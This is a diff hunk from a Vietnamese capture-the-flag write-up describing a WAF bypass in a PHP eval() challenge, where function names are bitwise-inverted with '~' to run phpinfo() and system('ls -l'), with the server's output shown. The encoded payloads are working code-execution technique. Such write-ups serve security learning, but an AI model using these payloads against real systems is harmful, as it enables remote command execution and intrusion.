@@ -37,8 +37,8 @@ May mắn là tìm ra ngay flag lun:
 + Sử dụng PHP eval() để thực hiện lệnh dc nhập vào -> WAF bypass
 + Chặn quote, alphabet và giới hạn kí tự-> sửa dụng '~' để đảo bit
 + ![image](https://user-images.githubusercontent.com/58381595/119289646-2a314680-bc75-11eb-9e46-b204ac314818.png)
-+ Thử đảo phpinfo thành ' %8F%97%8F%96%91%99%90 ' rồi gửi ' (~%8F%97%8F%96%91%99%90)() ' Thì quả thật lệnh phpinfo() đã được thực hiện
-+ system('ls -l') xem có gì nào : (~%8C%86%8C%8B%9A%92) (~%93%8C%DF%D2%93)
++ Thử đảo phpinfo thành ' %8F%97%8F%96%91%99%90 ' rồi gửi ``(~%8F%97%8F%96%91%99%90)()`` Thì quả thật lệnh phpinfo() đã được thực hiện
++ system('ls -l') xem có gì nào : ``(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D2%93)``
 > Warning: Use of undefined constant ���ғ - assumed '���ғ' (this will throw an Error in a future version of PHP) in /var/www/html/index.php(21) : eval()'d code on line 1
 total 4 -rwxrw-r--. 1 www-data root 856 May 18 11:52 index.php drwxr-xr-x. 1 www-data root 23 May 18 11:52 static drwxr-xr-x. 1 www-data root 23 May 18 11:52 static
 + Ra ngoài gốc lun xem có gì
